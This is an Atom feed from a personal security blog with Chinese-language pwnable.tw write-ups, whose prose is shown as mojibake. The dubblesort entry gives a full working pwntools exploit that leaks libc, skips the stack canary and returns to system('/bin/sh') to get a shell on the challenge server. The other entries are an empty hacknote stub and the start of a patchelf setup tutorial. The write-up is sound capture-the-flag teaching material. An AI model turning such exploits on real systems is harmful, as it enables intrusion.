<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kazma&#39;s blog</title>
  
  <subtitle>Decoding My Life: Tales of Code, Cyber, and Campus Life</subtitle>
  <link href="https://kazma.tw/atom.xml" rel="self"/>
  
  <link href="https://kazma.tw/"/>
  <updated>2024-04-20T03:08:22.792Z</updated>
  <id>https://kazma.tw/</id>
  
  <author>
    <name>kazma</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Pwnable.tw hacknote Writeup</title>
    <link href="https://kazma.tw/2024/04/20/Pwnable-tw-hacknote-Writeup/"/>
    <id>https://kazma.tw/2024/04/20/Pwnable-tw-hacknote-Writeup/</id>
    <published>2024-04-20T02:37:31.000Z</published>
    <updated>2024-04-20T03:08:22.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwnable-tw-hacknote"><a href="#Pwnable-tw-hacknote" class="headerlink" title="Pwnable.tw - hacknote"></a>Pwnable.tw - hacknote</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>A good Hacker should always take good notes!</p></blockquote><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   href="https://pwnable.tw/challenge/#5" >https://pwnable.tw/challenge/#5 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>å¸¸è¦‹çš„ heap é¸å–®é¡Œã€‚</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ file hacknote</span><br><span class="line">hacknote: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter ld-2.23.so, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=a32de99816727a2ffa1fe5f4a324238b2d59a606, stripped</span><br></pre></td></tr></table></figure></div><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ checksec hacknote</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/pwnabletw/hacknote/hacknote&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8046000)</span><br></pre></td></tr></table></figure></div><h3 id="dubblesort"><a href="#dubblesort" class="headerlink" title=".&#x2F;dubblesort"></a>.&#x2F;dubblesort</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./hacknote</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure></div><h2 id="0x2-patchelf"><a href="#0x2-patchelf" class="headerlink" title="0x2 patchelf"></a>0x2 patchelf</h2><p>è©³ç´°å¯ä»¥åƒè€ƒ <a href="https://kazma.tw/2024/04/19/Patchelf-Glibc-all-in-one-Combo/">é€™ç¯‡æ•™å­¸</a></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ patchelf --set-interpreter ./ld-2.23.so hacknote</span><br><span class="line">â””â”€$ patchelf --replace-needed libc.so.6 ./libc_32.so.6 hacknote</span><br><span class="line">â””â”€$ ldd hacknote</span><br><span class="line">        linux-gate.so.1 (0xf7f4b000)</span><br><span class="line">        ./libc_32.so.6 (0xf7d91000)</span><br><span class="line">        ld-2.23.so =&gt; /lib/ld-linux.so.2 (0xf7f4d000)</span><br></pre></td></tr></table></figure></div><h2 id="0x2-Fuzzing-Analyze"><a href="#0x2-Fuzzing-Analyze" class="headerlink" title="0x2 Fuzzing &amp; Analyze"></a>0x2 Fuzzing &amp; Analyze</h2><h2 id="0x3-Exploitation"><a href="#0x3-Exploitation" class="headerlink" title="0x3 Exploitation"></a>0x3 Exploitation</h2><h2 id="0x4-Exploit"><a href="#0x4-Exploit" class="headerlink" title="0x4 Exploit"></a>0x4 Exploit</h2><h3 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pwnable-tw-hacknote&quot;&gt;&lt;a href=&quot;#Pwnable-tw-hacknote&quot; class=&quot;headerlink&quot; title=&quot;Pwnable.tw - hacknote&quot;&gt;&lt;/a&gt;Pwnable.tw - hacknote&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
    
    <category term="heap" scheme="https://kazma.tw/tags/heap/"/>
    
    <category term="uaf" scheme="https://kazma.tw/tags/uaf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.tw dubblesort Writeup</title>
    <link href="https://kazma.tw/2024/04/19/Pwnable-tw-dubblesort-Writeup/"/>
    <id>https://kazma.tw/2024/04/19/Pwnable-tw-dubblesort-Writeup/</id>
    <published>2024-04-19T06:28:20.000Z</published>
    <updated>2024-04-20T03:08:33.314Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwnable-tw-dubblesort"><a href="#Pwnable-tw-dubblesort" class="headerlink" title="Pwnable.tw - dubblesort"></a>Pwnable.tw - dubblesort</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>Sort the memory!</p></blockquote><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   href="https://pwnable.tw/challenge/#4" >https://pwnable.tw/challenge/#4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>ä¸€å€‹æœƒå•ä½ åå­—ç„¶å¾Œ bubble sort çš„å°ç¨‹å¼ã€‚</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ file dubblesort</span><br><span class="line">dubblesort: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter ./ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped</span><br></pre></td></tr></table></figure></div><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ checksec ./dubblesort</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/pwnabletw/dubblesort/dubblesort&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></div><h3 id="dubblesort"><a href="#dubblesort" class="headerlink" title=".&#x2F;dubblesort"></a>.&#x2F;dubblesort</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./dubblesort</span><br><span class="line">What your name :kazma</span><br><span class="line">Hello kazma</span><br><span class="line">/,How many numbers <span class="keyword">do</span> you what to <span class="built_in">sort</span> :5</span><br><span class="line">Enter the 0 number : 3</span><br><span class="line">Enter the 1 number : 2</span><br><span class="line">Enter the 2 number : 8</span><br><span class="line">Enter the 3 number : 1</span><br><span class="line">Enter the 4 number : 5</span><br><span class="line">Processing......</span><br><span class="line">Result :</span><br><span class="line">1 2 3 5 8</span><br></pre></td></tr></table></figure></div><h2 id="0x2-patchelf"><a href="#0x2-patchelf" class="headerlink" title="0x2 patchelf"></a>0x2 patchelf</h2><p>è©³ç´°å¯ä»¥åƒè€ƒ <a href="https://kazma.tw/2024/04/19/Patchelf-Glibc-all-in-one-Combo/">é€™ç¯‡æ•™å­¸</a></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ patchelf --set-interpreter ./ld-2.23.so dubblesort</span><br><span class="line">â””â”€$ patchelf --replace-needed libc.so.6 ./libc_32.so.6 dubblesort</span><br><span class="line">â””â”€$ ldd dubblesort</span><br><span class="line">        linux-gate.so.1 (0xf7fba000)</span><br><span class="line">        ./libc_32.so.6 (0xf7df7000)</span><br><span class="line">        ./ld-2.23.so =&gt; /lib/ld-linux.so.2 (0xf7fbc000)</span><br></pre></td></tr></table></figure></div><h2 id="0x2-Fuzzing-Analyze"><a href="#0x2-Fuzzing-Analyze" class="headerlink" title="0x2 Fuzzing &amp; Analyze"></a>0x2 Fuzzing &amp; Analyze</h2><p>ç¨‹å¼å¾ˆå°ä¸€å€‹ï¼Œå¾è¼¸å…¥é»å¯ä»¥çœ‹åˆ°å…©å€‹æ¼æ´å¦‚ä¸‹ï¼š</p><ul><li><code>read</code> å¾Œæ²’æœ‰åŠ  <code>null byte</code>ï¼Œå¯ä»¥ leak libc_baseï¼š</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/dubble_read.png"                      alt="read"                ></p><ul><li>å¯ä»¥ oob writeï¼Œé€™é»å¾ fuzzing æœƒè§¸ç™¼ <code>stack smashing detected</code> å¯ä»¥ç™¼ç¾å®ƒèƒ½è¦†è“‹æ‰ canaryï¼š</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/dubble_scanf.png"                      alt="scanf"                ></p><h2 id="0x3-Exploitation"><a href="#0x3-Exploitation" class="headerlink" title="0x3 Exploitation"></a>0x3 Exploitation</h2><p>æ”»æ“Šæ€è·¯å¦‚ä¸‹ï¼š</p><ol><li>å…ˆé€éç¬¬ä¸€å€‹ <code>read</code> å» leak libc_baseã€‚</li><li>é€é oob write æƒ³è¾¦æ³•è“‹å° canary æˆ–æ˜¯ç¹éå®ƒã€‚</li><li>ret2libc çš„ <code>system</code> è·Ÿ <code>/bin/sh</code></li><li>è™•ç† sort </li><li>å¿«æ¨‚ RCE</li></ol><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><ul><li>æˆ‘å€‘ç”¨ gdb ä¾†åˆ†æ stack ä¸Šé¢çš„æ®˜æ¸£ï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ gdb -q dubblesort</span><br><span class="line">gefâ¤  start</span><br><span class="line">gefâ¤  <span class="built_in">break</span> <span class="built_in">read</span>@plt</span><br><span class="line">gefâ¤  c</span><br><span class="line">gefâ¤  fin</span><br><span class="line">aaaa</span><br><span class="line">gefâ¤  <span class="built_in">break</span> __printf_chk@plt</span><br><span class="line">gefâ¤  c</span><br><span class="line">gefâ¤  gef config context.nb_lines_stack 30</span><br><span class="line">gefâ¤  context stack</span><br><span class="line">gefâ¤  vmmap</span><br></pre></td></tr></table></figure></div>æ–¹æ³•å¤§è‡´å¦‚ä¸Šã€‚<br>æ¥è‘— demo è…³æœ¬ï¼Œstack å¦‚ä¸‹ï¼Œ<code>0x61616161</code> æ˜¯æˆ‘å€‘çš„è¼¸å…¥ï¼Œæœ€å¾Œå¡«ä¸Š â€˜zâ€™ ä¾†å¹«åŠ©æˆ‘å€‘æ”¶é›† leak çš„è³‡æ–™ï¼Œä¹Ÿå°±æ˜¯ <code>0x7a</code>ï¼Œå¾Œé¢ç·Šæ¥è‘—å°±æ˜¯ libc è£¡é¢çš„æŸå€‹åœ°å€ï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/dubble_base.png"                      alt="libc"                ><br>æ”¶é›† leak å‡ºä¾†çš„åœ°å€ä¹‹å¾Œå† <code>vmmap</code> å¯ä»¥ç®—å‡ºè·Ÿç•¶å‰ libc_base çš„å·®å€¼ï¼ŒæˆåŠŸè¨ˆç®—å®Œï¼ŒåŸ·è¡Œæœƒé•·å¾—åƒæœ€ä¸Šé¢é‚£æ¨£ã€‚</li></ul><h3 id="ç¹é-canary"><a href="#ç¹é-canary" class="headerlink" title="ç¹é canary"></a>ç¹é canary</h3><p>è©¦äº†ä¸€ä¸‹ç™¼ç¾æƒ³ä¸åˆ°æœ‰ä»€éº¼æ–¹å¼å¯ä»¥ leak å‡º canary åˆå¡«å›å»ï¼Œä½†ä¸Šç¶²æŸ¥æœƒç™¼ç¾ <code>scanf</code> æœ‰ä¸€äº›ç‰¹æ®Šçš„æ€§è³ªï¼Œä¾‹å¦‚é€™è£¡ <code>scanf</code> çš„ <code>format specifier</code> æ˜¯ <code>%u</code>ï¼Œä¹Ÿå°±æ˜¯ä»–æœƒæœŸå¾…æ”¶åˆ°ä¸€å€‹ç„¡è™Ÿåé€²åˆ¶æ•´æ•¸ï¼Œå¦‚æœå¡« <code>a</code> æœƒç›´æ¥å°è‡´å¾Œé¢çš„ <code>scanf</code> éƒ½å¤±æ•—ï¼Œå› ç‚º <code>stdin</code> ä¸€ç›´æ²’æœ‰è¢«å–èµ°ï¼Œè€Œåƒæ˜¯ <code>+</code>ã€<code>-</code> ä¸æœƒè®“ <code>scanf</code> å¤±æ•—ä½†ä¹Ÿä¸æœƒæ”¹è®Šé™£åˆ—åŸæœ¬çš„å€¼ï¼Œæˆ‘å€‘å¯ä»¥åˆ©ç”¨é€™å€‹ä¾†è·³é canary çš„è¼¸å…¥ã€‚<br>ä¸€æ¨£ç”¨ gdb å¯ä»¥æŸ¥åˆ° canary ç›¸å°æ–¼ array[0] çš„ offsetï¼Œé€™è£¡è¼¸å…¥ 5 å€‹æ•¸å­—åˆ†åˆ¥æ˜¯ 1 ~ 5ï¼Œä¹Ÿå¯ä»¥ç”¨ ida æˆ–å…¶ä»–é€†å‘å·¥å…·ç›´æ¥ç®—ï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/dubble_canary.png"                      alt="canary"                ><br><code>(0x7c - 0x1c) / 4 + 1 = 25</code><br>æ‰€ä»¥ canary åœ¨ array[24]ï¼Œåˆ°å¾Œæœƒå¡« <code>+</code> æˆ– <code>-</code>ã€‚</p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">success(<span class="string">&#x27;libc_base -&gt; %s&#x27;</span> % <span class="built_in">hex</span>(l.address))</span><br><span class="line">success(<span class="string">&#x27;system -&gt; %s&#x27;</span> % <span class="built_in">hex</span>(l.sym.system))</span><br><span class="line">success(<span class="string">&#x27;bin_sh -&gt; %s&#x27;</span> % <span class="built_in">hex</span>(<span class="built_in">next</span>(l.search(<span class="string">&#x27;/bin/sh\0&#x27;</span>))))</span><br></pre></td></tr></table></figure></div><h3 id="è™•ç†æ’åº"><a href="#è™•ç†æ’åº" class="headerlink" title="è™•ç†æ’åº"></a>è™•ç†æ’åº</h3><p>å› ç‚ºæœ€å¾Œä»–æœƒæŠŠé™£åˆ—å…§çš„å€¼æ’åºï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥å…ˆå¡ 24 å€‹ 1ï¼Œç¹é canaryï¼Œç„¶å¾Œä¸€è·¯æ”¾ <code>system</code> åˆ° retï¼Œå†è£œå››å€‹ bytes è£œé½Š ret è·Ÿ call çš„å·®å€¼ï¼Œæœ€å¾Œæ”¾ä¸Š <code>&#39;/bin/sh\0&#39;</code>ï¼Œcanary é«˜æ©Ÿç‡éƒ½å°æ–¼ libc çš„åœ°å€ï¼Œ<code>system</code> çš„ offset ä¹Ÿå‰›å¥½æ¯” <code>&#39;/bin/sh\0&#39;</code> å°ï¼Œç•«æˆè¡¨æ ¼å¯ä»¥æ›´å¥½ç†è§£ï¼š</p><table><thead><tr><th align="center">array</th><th align="center">stack</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">a[0]~a[23]</td><td align="center"></td><td align="center">â€˜1â€™</td></tr><tr><td align="center">a[24]</td><td align="center">canary</td><td align="center">â€˜+â€™</td></tr><tr><td align="center">a[25]~a[30]</td><td align="center"></td><td align="center">â€œl.sym.systemâ€</td></tr><tr><td align="center">a[31]</td><td align="center">ebp</td><td align="center">â€œl.sym.systemâ€</td></tr><tr><td align="center">a[32]</td><td align="center">ret</td><td align="center">â€œl.sym.systemâ€</td></tr><tr><td align="center">a[33]</td><td align="center"></td><td align="center">â€œl.sym.systemâ€</td></tr><tr><td align="center">a[34]</td><td align="center"></td><td align="center">â€œnext(l.search(â€˜&#x2F;bin&#x2F;sh\0â€™))â€</td></tr></tbody></table><h3 id="ç’°å¢ƒå·®ç•°"><a href="#ç’°å¢ƒå·®ç•°" class="headerlink" title="ç’°å¢ƒå·®ç•°"></a>ç’°å¢ƒå·®ç•°</h3><p>åœ¨æœ¬åœ°æˆåŠŸ get shell äº†ï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/dubble_shell.png"                      alt="shell"                ><br>ä½†é€åˆ°é ç«¯æœƒç™¼ç¾ libc_base ç®—èµ·ä¾†ä¸å°ï¼Œæ„Ÿè¦ºæ˜¯ç’°å¢ƒä¸åŒå°è‡´ stack ä¸Šé¢çš„æ®˜å€¼æœ‰æ‰€ä¸åŒï¼Œä½†å·²ç¶“ç›¡å¯èƒ½çš„é€é <code>patchelf</code> å»æ¨¡æ“¬ä¸€æ¨£çš„ç’°å¢ƒï¼ŒçŒœæ¸¬æ˜¯å› ç‚ºé ç«¯æ˜¯ 32 ä½å…ƒçš„ç³»çµ±ã€‚</p><h2 id="0x4-Exploit"><a href="#0x4-Exploit" class="headerlink" title="0x4 Exploit"></a>0x4 Exploit</h2><p>ä¸Šç¶²æŸ¥åˆ°æ­£ç¢ºçš„ offset è£œä¸Šå¾Œå°±æˆåŠŸ get shell äº†ï¼<br>exploit.py å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ cat exploit.py</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./dubblesort&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10101</span>)</span><br><span class="line">l = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">27</span> + <span class="string">b&#x27;#&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;#&#x27;</span>)</span><br><span class="line"></span><br><span class="line">l.address = u32(r.recv(<span class="number">4</span>)) - <span class="number">0x1b0000</span> - <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">success(<span class="string">&#x27;libc_base -&gt; %s&#x27;</span> % <span class="built_in">hex</span>(l.address))</span><br><span class="line">success(<span class="string">&#x27;system -&gt; %s&#x27;</span> % <span class="built_in">hex</span>(l.sym.system))</span><br><span class="line">success(<span class="string">&#x27;bin_sh -&gt; %s&#x27;</span> % <span class="built_in">hex</span>(<span class="built_in">next</span>(l.search(<span class="string">&#x27;/bin/sh\0&#x27;</span>))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;35&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(l.sym.system))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">next</span>(l.search(<span class="string">&#x27;/bin/sh\0&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline( <span class="string">&#x27;cat /home/`whoami`/flag&#x27;</span> )</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>åŸ·è¡Œçµæœï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python exploit.py</span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10101: Done</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/pwnabletw/dubblesort/libc_32.so.6&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] libc_base -&gt; 0xf75be000</span><br><span class="line">[+] system -&gt; 0xf75f8940</span><br><span class="line">[+] bin_sh -&gt; 0xf7716e8b</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Processing......</span><br><span class="line">Result :</span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 2731900928 4150233408 4150233408 4150233408 4150233408 4150233408 4150233408 4150233408 4150233408 4150233408 4151406219 FLAG&#123;XXXXXXXXXXXXXXXXXXXX&#125;</span><br></pre></td></tr></table></figure></div><h3 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pwnable-tw-dubblesort&quot;&gt;&lt;a href=&quot;#Pwnable-tw-dubblesort&quot; class=&quot;headerlink&quot; title=&quot;Pwnable.tw - dubblesort&quot;&gt;&lt;/a&gt;Pwnable.tw - dubbleso</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="ret2libc" scheme="https://kazma.tw/tags/ret2libc/"/>
    
    <category term="oob" scheme="https://kazma.tw/tags/oob/"/>
    
    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
    
  </entry>
  
  <entry>
    <title>Patchelf &amp; Glibc-all-in-one Combo</title>
    <link href="https://kazma.tw/2024/04/19/Patchelf-Glibc-all-in-one-Combo/"/>
    <id>https://kazma.tw/2024/04/19/Patchelf-Glibc-all-in-one-Combo/</id>
    <published>2024-04-19T01:05:57.000Z</published>
    <updated>2024-04-25T13:15:05.688Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Patchelf-Glibc-all-in-one-Combo"><a href="#Patchelf-Glibc-all-in-one-Combo" class="headerlink" title="Patchelf &amp; Glibc-all-in-one Combo"></a>Patchelf &amp; Glibc-all-in-one Combo</h1><p>é€™ç¯‡ä¸»è¦æœƒæåˆ°å¹³å¸¸åœ¨æ¨¡æ“¬ Pwn é ç«¯ç’°å¢ƒçš„å¥½ç”¨çµ„åˆæŠ€ã€‚</p><h2 id="0x1-Introduction"><a href="#0x1-Introduction" class="headerlink" title="0x1 Introduction"></a>0x1 Introduction</h2><p>ä»Šå¤©æœƒç”¨ <a class="link"   href="https://pwnable.tw/" >pwnable.tw <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> çš„ <a class="link"   href="https://pwnable.tw/challenge/#4" >dubblesort <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ç¤ºç¯„ã€‚<br><code>patchelf</code> å’Œ <code>glibc-all-in-one</code> å®‰è£æ–¹å¼å¦‚ä¸‹ï¼š</p><h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ sudo apt install patchelf</span><br></pre></td></tr></table></figure></div><h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git </span><br></pre></td></tr></table></figure></div><h2 id="0x2-Demo"><a href="#0x2-Demo" class="headerlink" title="0x2 Demo"></a>0x2 Demo</h2><ul><li>é¦–å…ˆæˆ‘å€‘è¦çŸ¥é“é¡Œç›®é™„çµ¦æˆ‘å€‘çš„ libc æ˜¯ä»€éº¼ç‰ˆæœ¬çš„ï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ strings libc_32.so.6 | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">        GNU Libidn by Simon 